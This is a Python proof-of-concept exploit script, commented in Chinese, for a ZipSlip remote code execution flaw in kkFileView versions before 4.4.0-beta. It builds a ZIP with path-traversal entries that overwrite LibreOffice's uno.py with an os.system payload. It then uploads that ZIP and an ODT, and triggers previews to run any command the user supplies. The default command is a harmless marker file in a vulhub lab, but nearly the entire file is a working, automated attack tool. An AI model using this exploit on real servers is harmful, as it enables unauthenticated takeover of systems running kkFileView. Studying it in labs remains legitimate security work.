#!/usr/bin/env python3
"""
kkFileView ZipSlip 远程代码执行漏洞 POC
漏洞: kkFileView ZipSlip RCE (无CVE编号)
漏洞等级: 严重

==================== 漏洞描述 ====================
【漏洞原理】
kkFileView 4.4.0-beta之前版本在预览ZIP文件时，未对ZIP条目中的路径进行
有效过滤。攻击者可以构造包含路径穿越的ZIP文件，通过预览功能将恶意文件
写入服务器任意目录，结合LibreOffice的uno.py加载机制实现远程代码执行。

【影响范围】
- kkFileView < 4.4.0-beta
- 端口: 8012

【危害等级】
- 无需认证
- 可覆盖任意文件(通过ZipSlip)
- 结合LibreOffice uno.py实现RCE

【参考链接】
- https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC

==================== 环境要求 ====================
- Python 3.6+
- requests库
- 需要sample.odt文件 (位于vulhub/kkfileview/4.3-zipslip-rce/目录)

==================== 验证步骤 ====================
1. 基础检测:
   python kkfileview_zipslip_rce.py http://target:8012 --check-only

2. 生成恶意ZIP:
   python kkfileview_zipslip_rce.py http://target:8012 --generate -c "touch /tmp/success"

3. 完整利用:
   python kkfileview_zipslip_rce.py http://target:8012 --exploit -c "touch /tmp/success"
   (自动上传、触发预览、执行命令)

==================== 预期结果 ====================
- 命令在kkFileView服务器执行
- 验证: docker compose exec web ls -la /tmp/success
"""

import sys
import os
import io
import re
import json
import zipfile
import requests
import argparse
from typing import Dict, Optional
from urllib.parse import urljoin


class KkfileviewZipSlipPOC:
    """kkFileView ZipSlip RCE POC"""

    VULN_NAME = "kkFileView ZipSlip Remote Code Execution"
    CVE_ID = "N/A"
    SEVERITY = "严重"
    AFFECTED = "kkFileView < 4.4.0-beta"

    # LibreOffice uno.py路径 (根据容器环境)
    UNO_PATHS = [
        "../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py",
        "../../../../../../../../../../../../../../../../../../../opt/libreoffice7.6/program/uno.py",
        "../../../../../../../../../../../../../../../../../../../opt/libreoffice/program/uno.py",
        "../../../../../../../../../../../../../../../../../../../usr/lib/libreoffice/program/uno.py",
    ]

    def __init__(self, target: str, timeout: int = 15, proxy: str = None,
                 verify_ssl: bool = False):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.proxy = proxy
        self.verify_ssl = verify_ssl

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = self.verify_ssl
        if self.proxy:
            session.proxies = {"http": self.proxy, "https": self.proxy}
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        if not self.verify_ssl:
            requests.packages.urllib3.disable_warnings()
        return session

    def _generate_zip(self, command: str,
                      uno_path: str = None) -> bytes:
        """生成包含路径穿越的ZIP文件"""
        if uno_path is None:
            uno_path = self.UNO_PATHS[0]

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("test", b"vulhub")
            payload = f"import os\nos.system('{command}')\n".encode()
            zf.writestr(uno_path, payload)
        return buf.getvalue()

    def _find_sample_odt(self) -> Optional[bytes]:
        """查找sample.odt文件"""
        paths = [
            os.path.join(os.path.dirname(__file__),
                         "../kkfileview/4.3-zipslip-rce/sample.odt"),
            os.path.join(os.getcwd(),
                         "kkfileview/4.3-zipslip-rce/sample.odt"),
            "/home/ubuntu/vulhub/kkfileview/4.3-zipslip-rce/sample.odt",
            "./sample.odt",
        ]
        for p in paths:
            p = os.path.abspath(p)
            if os.path.isfile(p):
                with open(p, "rb") as f:
                    return f.read()
        return None

    def _upload_file(self, session: requests.Session,
                     filename: str, data: bytes) -> Optional[str]:
        """上传文件到kkFileView, 返回文件URL"""
        # 尝试多个上传端点
        endpoints = [
            "/fileUpload",
            "/upload",
            "/api/upload",
            "/file/upload",
        ]
        for ep in endpoints:
            url = urljoin(self.target, ep)
            try:
                files = {"file": (filename, data)}
                resp = session.post(url, files=files, timeout=self.timeout,
                                    allow_redirects=False)
                if resp.status_code in (200, 302, 301):
                    # 尝试从响应中提取文件URL
                    text = resp.text

                    # 各种响应格式
                    for pattern in [
                        r'"url"\s*:\s*"([^"]+)"',
                        r'"data"\s*:\s*"([^"]+)"',
                        r'"fileUrl"\s*:\s*"([^"]+)"',
                        r'"path"\s*:\s*"([^"]+)"',
                        r'url=([^&\s"]+)',
                    ]:
                        m = re.search(pattern, text)
                        if m:
                            file_url = m.group(1)
                            if file_url.startswith("http"):
                                return file_url
                            if file_url.startswith("/"):
                                return urljoin(self.target, file_url)
                            return urljoin(self.target, "/" + file_url)
                    # 从Location header取
                    location = resp.headers.get("Location", "")
                    if location:
                        return urljoin(self.target, location)
                    return urljoin(self.target, "/" + filename)
            except Exception:
                continue
        return None

    def _trigger_preview(self, session: requests.Session,
                         file_url: str) -> bool:
        """触发文件预览(触发ZIP提取或ODT渲染)"""
        preview_url = urljoin(self.target, "/onlinePreview")
        params = {"url": file_url}
        try:
            resp = session.get(preview_url, params=params, timeout=self.timeout)
            return resp.status_code == 200
        except Exception:
            return False

    def check(self) -> Dict:
        """检测kkFileView服务"""
        result = {
            "vulnerability": f"{self.VULN_NAME} ({self.CVE_ID})",
            "target": self.target,
            "status": "unknown",
            "details": [],
            "conclusion": ""
        }
        session = self._create_session()

        print("[*] 步骤1/2: 检测kkFileView服务...")
        try:
            resp = session.get(self.target, timeout=self.timeout)
            print(f"[*] HTTP {resp.status_code}")
            result["details"].append(f"HTTP {resp.status_code}")
            if "kkFileView" in resp.text or "file" in resp.text.lower():
                result["details"].append("识别为kkFileView")
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"服务不可达: {e}"
            return result

        print("[*] 步骤2/2: 检查上传和预览端点...")
        for ep in ["/fileUpload", "/onlinePreview"]:
            url = urljoin(self.target, ep)
            try:
                resp = session.get(url, timeout=self.timeout)
                if resp.status_code != 404:
                    result["details"].append(f"端点: {ep} (HTTP {resp.status_code})")
                    print(f"[+] {ep} 可用")
                else:
                    print(f"[-] {ep} 不可用")
            except Exception:
                pass

        result["status"] = "suspected_vulnerable"
        result["conclusion"] = (
            "kkFileView服务运行中。\n"
            "利用步骤:\n"
            "  1. python kkfileview_zipslip_rce.py "
            f"{self.target} --generate -c \"touch /tmp/success\"\n"
            "  2. 上传生成的test.zip和sample.odt到kkFileView\n"
            "  3. 预览test.zip触发文件写入\n"
            "  4. 预览sample.odt触发uno.py执行"
        )
        return result

    def exploit(self, command: str = "touch /tmp/success",
                zip_path: str = "") -> Dict:
        """
        完整利用链:
        步骤1: 生成恶意ZIP
        步骤2: 上传ZIP和ODT
        步骤3: 预览ZIP (写入uno.py)
        步骤4: 预览ODT (触发命令执行)
        """
        result = {
            "vulnerability": f"{self.VULN_NAME} ({self.CVE_ID})",
            "target": self.target,
            "command": command,
            "status": "unknown",
            "details": [],
            "output": "",
            "conclusion": ""
        }
        session = self._create_session()

        # 步骤1: 生成恶意ZIP
        print("[*] 步骤1/4: 生成恶意ZIP...")
        if zip_path:
            with open(zip_path, "rb") as f:
                zip_data = f.read()
            print(f"[*] 使用已有ZIP: {zip_path}")
        else:
            zip_data = self._generate_zip(command)
            print(f"[*] ZIP生成完毕 ({len(zip_data)} 字节)")
        result["details"].append(f"ZIP大小: {len(zip_data)} 字节")

        # 获取ODT
        odt_data = self._find_sample_odt()
        if not odt_data:
            result["status"] = "failed"
            result["conclusion"] = (
                "未找到sample.odt文件。请手动上传ZIP和ODT。\n"
                "ZIP已生成, 上传后预览触发RCE。"
            )
            return result
        print(f"[*] sample.odt: {len(odt_data)} 字节")

        # 步骤2: 上传文件
        print("[*] 步骤2/4: 上传恶意ZIP和ODT...")

        # 先上传ODT
        odt_url = self._upload_file(session, "sample.odt", odt_data)
        if odt_url:
            result["details"].append(f"ODT上传: {odt_url}")
            print(f"[+] ODT上传成功: {odt_url}")
        else:
            print("[*] ODT上传状态未知, 尝试继续...")

        # 上传ZIP
        zip_url = self._upload_file(session, "test.zip", zip_data)
        if zip_url:
            result["details"].append(f"ZIP上传: {zip_url}")
            print(f"[+] ZIP上传成功: {zip_url}")
        else:
            print("[*] ZIP上传状态未知, 尝试继续...")

        if not zip_url and not odt_url:
            result["status"] = "failed"
            result["conclusion"] = "文件上传失败，请尝试手动上传"
            return result

        # 步骤3: 预览ZIP (触发ZipSlip文件写入)
        print("[*] 步骤3/4: 预览ZIP触发文件写入...")
        preview_url = urljoin(self.target, "/onlinePreview")
        try:
            resp = session.get(preview_url,
                               params={"url": zip_url or "test.zip"},
                               timeout=self.timeout)
            result["details"].append(f"ZIP预览: HTTP {resp.status_code}")
            print(f"[*] ZIP预览: HTTP {resp.status_code}")
        except Exception as e:
            print(f"[*] ZIP预览请求异常: {e}")

        # 步骤4: 预览ODT (触发uno.py执行)
        print("[*] 步骤4/4: 预览ODT触发命令执行...")
        try:
            resp = session.get(preview_url,
                               params={"url": odt_url or "sample.odt"},
                               timeout=self.timeout)
            result["details"].append(f"ODT预览: HTTP {resp.status_code}")
            print(f"[*] ODT预览: HTTP {resp.status_code}")
            if resp.status_code == 200:
                result["status"] = "suspected_exploited"
                result["conclusion"] = (
                    "利用链已完整执行。\n"
                    "验证命令执行:\n"
                    f"  docker compose exec web ls -la /tmp/success\n"
                    "注意: 如有缓存问题, 可稍后重试预览ODT"
                )
            else:
                result["status"] = "suspected_exploited"
                result["conclusion"] = (
                    "请求已发送。请检查命令是否执行:\n"
                    "  docker compose exec web ls -la /tmp"
                )
        except Exception as e:
            result["status"] = "suspected_exploited"
            result["conclusion"] = f"ODT预览异常({e}), 请手动检查命令执行结果"

        return result

    def generate(self, command: str = "touch /tmp/success",
                 output: str = "test.zip") -> Dict:
        """仅生成恶意ZIP"""
        result = {
            "vulnerability": f"{self.VULN_NAME} ({self.CVE_ID})",
            "status": "generated",
            "file": output,
            "command": command,
            "details": [],
            "conclusion": ""
        }

        zip_data = self._generate_zip(command)
        with open(output, "wb") as f:
            f.write(zip_data)
        result["details"].append(f"ZIP: {output} ({len(zip_data)} 字节)")
        print(f"[+] 恶意ZIP已生成: {output}")
        print(f"    Payload: os.system('{command}')")
        print(f"    大小: {len(zip_data)} 字节")

        result["conclusion"] = (
            f"ZIP文件已生成: {output}\n"
            "使用步骤:\n"
            "  1. 上传test.zip和sample.odt到kkFileView\n"
            "  2. 预览test.zip (触发路径穿越写入uno.py)\n"
            "  3. 预览sample.odt (触发uno.py执行)"
        )
        return result

    def run(self, command: str = "", zip_path: str = "",
            gen_only: bool = False, output: str = "test.zip") -> Dict:
        print(f"[*] {self.VULN_NAME} - 开始验证")
        print(f"[*] 目标: {self.target}")
        print(f"[*] 严重等级: {self.SEVERITY}")
        print("-" * 60)
        if gen_only:
            return self.generate(command, output)
        if command or zip_path:
            return self.exploit(command, zip_path)
        return self.check()

    def print_result(self, result: Dict):
        status = result.get("status", "unknown")
        icons = {"exploited": "[+]", "vulnerable": "[+]",
                 "suspected_exploited": "[?]", "generated": "[*]",
                 "failed": "[-]", "not_vulnerable": "[-]", "error": "[!]"}
        icon = icons.get(status, "[-]")
        print(f"\n{'=' * 60}")
        print(f"{icon} 漏洞: {result['vulnerability']}")
        if result.get("target"):
            print(f"    目标: {result['target']}")
        print(f"    状态: {status}")
        if result.get("command"):
            print(f"    命令: {result['command']}")
        if result.get("file"):
            print(f"    文件: {result['file']}")
        for d in result.get("details", []):
            print(f"    {d}")
        print(f"    结论: {result.get('conclusion', '')}")
        print(f"{'=' * 60}")


def main():
    parser = argparse.ArgumentParser(
        description="kkFileView ZipSlip RCE POC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
利用步骤:
  1. 生成恶意ZIP:
     python kkfileview_zipslip_rce.py http://target:8012 --generate -c "touch /tmp/success"

  2. 上传test.zip和sample.odt到kkFileView (需手动或自动)

  3. 预览test.zip -> 再预览sample.odt -> 触发RCE

原理: ZipSlip写入uno.py -> LibreOffice加载uno.py -> RCE
        """
    )
    parser.add_argument("target", help="目标URL (e.g., http://192.168.1.100:8012)")
    parser.add_argument("--check-only", action="store_true", help="仅检测不利用")
    parser.add_argument("--generate", action="store_true", help="仅生成恶意ZIP")
    parser.add_argument("--exploit", action="store_true", help="全自动利用")
    parser.add_argument("-c", "--command", default="touch /tmp/success", help="要执行的命令")
    parser.add_argument("-z", "--zip", default="test.zip", help="输出ZIP路径")
    parser.add_argument("-t", "--timeout", type=int, default=30, help="请求超时(秒)")
    parser.add_argument("--proxy", help="HTTP代理")
    parser.add_argument("-k", "--insecure", action="store_true", help="跳过SSL验证")
    parser.add_argument("--output", choices=["text", "json"], default="text")
    args = parser.parse_args()

    poc = KkfileviewZipSlipPOC(
        target=args.target, timeout=args.timeout,
        proxy=args.proxy, verify_ssl=not args.insecure
    )

    if args.check_only:
        result = poc.check()
    elif args.generate:
        result = poc.generate(args.command, args.zip)
    elif args.exploit:
        result = poc.run(args.command)
    else:
        result = poc.check()

    if args.output == "json":
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        poc.print_result(result)


if __name__ == "__main__":
    main()
